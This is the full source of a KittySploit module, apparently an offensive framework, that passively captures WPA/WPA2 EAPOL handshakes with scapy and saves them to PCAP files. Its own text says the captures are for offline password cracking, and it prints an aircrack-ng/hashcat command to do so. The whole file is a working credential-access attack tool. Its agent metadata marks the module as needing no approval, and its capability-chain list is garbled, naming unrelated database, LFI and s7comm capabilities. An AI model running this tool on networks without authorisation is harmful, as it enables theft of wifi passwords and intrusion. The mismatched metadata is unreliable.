#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Passively capture WPA/WPA2 EAPOL handshakes on a monitor-mode interface."""

from __future__ import annotations

import os
import time
from typing import Dict, List, Optional, Tuple

from kittysploit import *


class Module(Auxiliary):
    __info__ = {
        "name": "WiFi Handshake Capture",
        "description": (
            "Passively capture WPA/WPA2 EAPOL key exchanges on a monitor-mode interface "
            "and save matching frames to a PCAP file for offline cracking."
        ),
        "author": ["KittySploit Team"],
        "tags": ["scanner", "wlan", "wifi", "wireless", "eapol", "handshake", "802.11"],
        "references": [
            "https://attack.mitre.org/techniques/T1040/",
        ],
        "attack": {
            "tactics": ["TA0006", "Credential Access"],
            "techniques": ["T1040"],
            "prerequisites": [
                "Wireless adapter capable of monitor mode",
                "Interface in monitor mode (e.g. wlan0mon via airmon-ng)",
                "Root or CAP_NET_RAW on the capture interface",
                "A client associating or reassociating to the target AP during capture",
            ],
            "detections": [
                "802.11 passive monitoring on adjacent channels",
            ],
            "artifacts": [
                "Wireless IDS / WIDS events",
                "Saved PCAP files on operator host",
            ],
        },
    'agent': {
        'risk': '',
        'effects': ['wireless_sniff'],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': ['evidence', 'tech_hints'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    iface = OptString("wlan0mon", "Monitor-mode wireless interface", required=True)
    timeout = OptInteger(120, "Capture duration in seconds", required=False)
    bssid = OptString("", "Target AP BSSID (empty = any access point)", required=False)
    client = OptString("", "Target client MAC (empty = any station)", required=False)
    min_eapol_keys = OptInteger(
        2,
        "Minimum EAPOL-Key frames required before saving (2=partial, 4=full handshake)",
        required=False,
    )
    stop_on_capture = OptBool(
        True,
        "Stop capture early once handshake threshold is reached",
        required=False,
    )
    output = OptString(
        "",
        "Output PCAP path (empty = auto-generated filename in current directory)",
        required=False,
    )

    def check(self):
        try:
            from scapy.all import Dot11, EAPOL, sniff, wrpcap  # noqa: F401
        except ImportError:
            print_error("scapy is not installed. Install it with: pip install scapy")
            return False

        iface = str(self.iface or "").strip()
        if not iface:
            print_error("Interface name is required")
            return False

        try:
            from scapy.all import get_if_list

            if iface not in get_if_list():
                print_warning(f"Interface {iface} not found in scapy interface list")
        except Exception:
            pass

        return True

    def run(self):
        from scapy.all import Dot11, EAPOL, sniff, wrpcap

        iface = str(self.iface or "wlan0mon").strip()
        timeout = max(1, int(self.timeout or 120))
        bssid_filter = str(self.bssid or "").strip().lower()
        client_filter = str(self.client or "").strip().lower()
        min_keys = max(1, min(int(self.min_eapol_keys or 2), 4))
        stop_on_capture = bool(self.stop_on_capture)

        captures: Dict[Tuple[str, str], List] = {}
        key_counts: Dict[Tuple[str, str], int] = {}
        saved_paths: List[str] = []
        stop_capture = {"flag": False}

        print_info(f"WiFi handshake capture on {iface} for up to {timeout}s")
        if bssid_filter:
            print_info(f"BSSID filter: {bssid_filter}")
        if client_filter:
            print_info(f"Client filter: {client_filter}")
        print_info(f"Saving when >= {min_keys} EAPOL-Key frame(s) observed for a pair")
        print_info("=" * 72)
        print_status("Waiting for EAPOL key exchange (Ctrl+C to stop early)...")

        def ap_client(dot11: Dot11) -> Tuple[Optional[str], Optional[str]]:
            to_ds = bool(dot11.FCfield & 0x1)
            from_ds = bool(dot11.FCfield & 0x2)
            if to_ds and not from_ds:
                return dot11.addr1, dot11.addr2
            if from_ds and not to_ds:
                return dot11.addr2, dot11.addr1
            return dot11.addr3, dot11.addr2

        def matches_filters(ap: str, station: str) -> bool:
            if bssid_filter and (ap or "").lower() != bssid_filter:
                return False
            if client_filter and (station or "").lower() != client_filter:
                return False
            return bool(ap and station)

        def save_handshake(ap: str, station: str, packets: List) -> None:
            path = str(self.output or "").strip()
            if not path:
                stamp = time.strftime("%Y%m%d_%H%M%S")
                ap_tag = ap.replace(":", "")
                path = f"wlan_handshake_{ap_tag}_{stamp}.pcap"
            path = os.path.abspath(path)
            wrpcap(path, packets)
            saved_paths.append(path)
            print_success(f"Handshake saved: {path} ({len(packets)} frame(s), AP {ap}, client {station})")
            print_info("Crack offline with: aircrack-ng -w wordlist.txt <pcap>  or hashcat mode 22000")

        def on_packet(packet):
            if stop_capture["flag"]:
                return
            if not packet.haslayer(Dot11) or not packet.haslayer(EAPOL):
                return

            eapol = packet[EAPOL]
            if int(getattr(eapol, "type", -1)) != 3:
                return

            ap, station = ap_client(packet[Dot11])
            if not matches_filters(ap or "", station or ""):
                return

            pair = (ap, station)
            captures.setdefault(pair, []).append(packet)
            key_counts[pair] = key_counts.get(pair, 0) + 1
            count = key_counts[pair]
            print_status(f"EAPOL-Key {count}/{min_keys} | AP: {ap} | Client: {station}")

            if count >= min_keys:
                save_handshake(ap, station, captures[pair])
                if stop_on_capture:
                    stop_capture["flag"] = True

        try:
            sniff(
                iface=iface,
                prn=on_packet,
                timeout=timeout,
                store=0,
                stop_filter=lambda _: stop_capture["flag"],
            )
        except PermissionError:
            print_error(
                f"Permission denied capturing on {iface}. "
                "Run as root or grant CAP_NET_RAW, and ensure monitor mode is enabled."
            )
            return False
        except OSError as exc:
            print_error(f"Could not sniff on {iface}: {exc}")
            print_info("Tip: put the interface in monitor mode, e.g. sudo airmon-ng start wlan0")
            return False
        except KeyboardInterrupt:
            print_warning("Capture interrupted by user")

        print_info("=" * 72)
        if saved_paths:
            print_success(f"Capture complete: {len(saved_paths)} PCAP file(s) written")
            for path in saved_paths:
                print_info(f"  {path}")
            return True

        if key_counts:
            print_warning(
                "EAPOL-Key frames seen but threshold not met — "
                f"increase TIMEOUT or lower MIN_EAPOL_KEYS (current: {min_keys})"
            )
            for (ap, station), count in sorted(key_counts.items()):
                print_info(f"  {ap} <-> {station}: {count} EAPOL-Key frame(s)")
            return False

        print_warning(
            "No EAPOL handshakes captured — wait for a client to connect/reconnect to the target AP"
        )
        return False
